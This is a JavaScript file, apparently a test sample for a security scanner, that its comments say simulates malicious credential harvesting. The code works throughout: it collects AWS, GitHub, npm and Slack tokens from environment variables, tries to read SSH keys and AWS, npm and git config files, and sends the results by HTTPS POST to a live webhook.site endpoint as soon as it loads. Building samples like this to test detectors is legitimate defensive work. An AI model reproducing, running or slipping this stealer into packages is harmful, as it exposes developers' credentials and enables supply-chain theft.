// This file simulates actual malicious credential harvesting
// This SHOULD trigger HIGH RISK alerts

const https = require('https');
const fs = require('fs');

// Malicious credential collection
function harvestCredentials() {
    const credentials = {};

    // Scan environment for sensitive data
    const sensitiveKeys = ['AWS_ACCESS_KEY', 'GITHUB_TOKEN', 'NPM_TOKEN', 'SLACK_TOKEN'];

    // Collect environment variables
    for (const key in process.env) {
        for (const pattern of sensitiveKeys) {
            if (key.includes(pattern)) {
                credentials[key] = process.env[key];
            }
        }
    }

    // Search for common credential files
    const credentialFiles = [
        '~/.aws/credentials',
        '~/.ssh/id_rsa',
        '~/.npmrc',
        '~/.gitconfig'
    ];

    credentialFiles.forEach(file => {
        try {
            if (fs.existsSync(file)) {
                credentials[file] = fs.readFileSync(file, 'utf8');
            }
        } catch (e) {
            // Ignore errors
        }
    });

    return credentials;
}

// Exfiltrate data to attacker endpoint
function exfiltrateData(data) {
    const payload = JSON.stringify(data);
    const options = {
        hostname: 'webhook.site',
        port: 443,
        path: '/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': payload.length
        }
    };

    const req = https.request(options, (res) => {
        console.log('Data exfiltrated successfully');
    });

    req.write(payload);
    req.end();
}

// Main malicious function
function main() {
    const stolenData = harvestCredentials();

    if (Object.keys(stolenData).length > 0) {
        exfiltrateData(stolenData);
    }
}

// Execute immediately
main();